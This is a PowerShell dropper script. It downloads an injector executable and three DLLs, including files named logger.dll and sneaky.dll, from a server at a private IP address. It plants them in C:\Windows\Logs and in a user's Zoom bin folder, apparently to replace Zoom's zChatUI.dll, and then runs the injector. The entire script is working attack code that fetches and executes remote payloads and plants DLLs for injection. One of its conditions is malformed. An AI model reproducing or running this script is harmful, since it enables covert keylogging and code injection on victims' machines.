# Define server and file locations
$server = "http://192.168.64.142"
$injector = "$server/sys_inj.exe"
$logger = "$server/logger.dll"
$sneaky = "$server/sneaky.dll"
$zChatUI = "$server/zChatUI.dll"

# Define local paths
$injectorPath = "$env:TEMP\sys_inj.exe"
$loggerPath = "$env:TEMP\logger.dll"
$sneakyPath = "$env:TEMP\sn34ky.dll"
$zChatUIPath = "$env:TEMP\zChatUI_sus.dll"
$finalInjectPath = "C:\Windows\Logs\sys_inj.exe"
$finalLoggerPath = "C:\Windows\Logs\logger.dll"
$finalSneakyPath = "C:\Users\Tandoor_Wala\AppData\Roaming\Zoom\bin\sn34ky.dll"
$finalzChatUIPath = "C:\Users\Tandoor_Wala\AppData\Roaming\Zoom\bin\zChatUI_sus.dll"

# Function to download a file using Invoke-WebRequest
function Download-File {
    param (
        [string]$url,
        [string]$output
    )
    Invoke-WebRequest -Uri $url -OutFile $output
}

# Step 1: Download injector.exe
Write-Host "[+] Downloading injector.exe..."
Download-File -url $injector -output $injectorPath

# Step 2: Wait for 15 seconds
Start-Sleep -Seconds 15

# Step 3: Download logger.dll, sneaky.dll, and zChatUI.dll
Write-Host "[+] Downloading logger.dll..."
Download-File -url $logger -output $loggerPath

Write-Host "[+] Downloading sneaky.dll..."
Download-File -url $sneaky -output $sneakyPath

Write-Host "[+] Downloading zChatUI.dll..."
Download-File -url $zChatUI -output $zChatUIPath

# Step 4: Wait for all DLLs to finish downloading
while (!(Test-Path $loggerPath and Test-Path $sneakyPath -and Test-Path $zChatUIPath)) {
    Start-Sleep -Seconds 1
}

$zoomDllPath = "C:\Users\Tandoor_Wala\AppData\Roaming\Zoom\bin\zChatUI.dll"
$backupDllPath = "C:\Users\Tandoor_Wala\AppData\Roaming\Zoom\bin\zChatUI_original.dll"

# Check if zChatUI.dll exists before renaming
if (Test-Path $zoomDllPath) {
    Write-Host "[+] Renaming original zChatUI.dll to zChatUI_original.dll..."
    #Rename-Item -Path $zoomDllPath -NewName "zChatUI_original.dll" -Force
} else {
    Write-Host "[!] Original zChatUI.dll not found. Skipping rename."
}

# Step 5: Move DLLs to C:\Windows\Logs
Write-Host "[+] Moving DLLs to C:\Windows\Logs..."
Move-Item -Path $injectorPath -Destination $finalInjectPath -Force
Move-Item -Path $loggerPath -Destination $finalLoggerPath -Force
Move-Item -Path $sneakyPath -Destination $finalSneakyPath -Force
Move-Item -Path $zChatUIPath -Destination $finalzChatUIPath -Force

# Step 6: Run injector.exe
Write-Host "[+] Running ..."

Start-Process -FilePath "notepad.exe"
Start-Sleep -Seconds 2
Start-Process -FilePath "mspaint.exe"

Start-Sleep -Seconds 5

Start-Process -FilePath $finalInjectPath


